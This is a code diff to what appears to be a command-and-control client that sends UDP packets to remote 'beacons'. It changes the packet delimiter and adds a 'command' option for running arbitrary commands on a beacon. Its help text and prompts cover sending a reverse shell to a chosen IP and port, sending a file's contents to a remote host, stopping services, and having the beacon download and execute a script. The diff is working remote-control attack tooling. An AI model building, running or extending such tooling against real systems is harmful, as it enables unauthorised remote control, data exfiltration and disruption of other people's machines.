@@ -54,7 +54,7 @@ def runInteractive(SERVER):
                         port = input("Enter port to send shell to (1-510): ")
                         if not ((int(port) > 0) and (int(port) <= 510)):
                             print("Invalid port entered. Valid port range is 1-510.")
-                    packet = "shell:" + ip + ":" + port + ":" + selection
+                    packet = "shell###" + ip + "###" + port + "###" + selection
                     try:
                         sock.sendto(packet.encode(),(SERVER, 10000))
                     except socket.timeout:
@@ -81,7 +81,7 @@ def runInteractive(SERVER):
                         port = input("Enter port to send shell to (1-510): ")
                         if not ((int(port) > 0) and (int(port) <= 510)):
                             print("Invalid port entered. Valid port range is 1-510.")
-                    packet = "file:" + filePath + ":" + ip + ":" + port + ":" + selection
+                    packet = "file###" + filePath + "###" + ip + "###" + port + "###" + selection
                     try:
                         sock.sendto(packet.encode(),(SERVER, 10000))
                     except socket.timeout:
@@ -98,7 +98,27 @@ def runInteractive(SERVER):
                         serviceName = input("Enter service name: ")
                         if not (len(serviceName) > 0):
                             print("Invalid service name.")
-                    packet = "service:" + serviceName + ":" + selection
+                    packet = "service###" + serviceName + "###" + selection
+                    try:
+                        sock.sendto(packet.encode(),(SERVER, 10000))
+                    except socket.timeout:
+                        print("Socket timeout. Server may be down or otherwise unresponsive.")
+                    try:
+                        resp, _ = sock.recvfrom(512)
+                    except socket.timeout:
+                        print("Socket timeout. Server may be down or otherwise unresponsive.")
+                    if not (resp.decode() == "confirm"):
+                        print("Server error. Action not performed.")
+                elif (entered == "command"):
+                    command = ""
+                    while not (len(command) > 0):
+                        command = input("Enter command to run: ")
+                        if not (len(command) > 0):
+                            print("Invalid command.")
+                        elif (len(command) > 300):
+                            print("Command too long. Maximum length is 300 characters.")
+                            print("Suggested action: Create script to run multiple commands, and have remote host download and execute script instead of sending long command directly.")
+                    packet = "command###" + command + "###" + selection
                     try:
                         sock.sendto(packet.encode(),(SERVER, 10000))
                     except socket.timeout:
@@ -198,6 +218,7 @@ exit - exits out of the selected beacon and returns to the main controller
 shell - prompts for IP/port to send a reverse shell to
 file - prompts for file name to collect data from and the ip/port to send the data to
 service - prompts for service name to stop on the beacon
+command - prompts for command to run on the beacon. Note: Maximum command length is 300 characters. For longer commands, consider having the beacon download and execute a script instead of sending the long command directly.
 
 """)
 
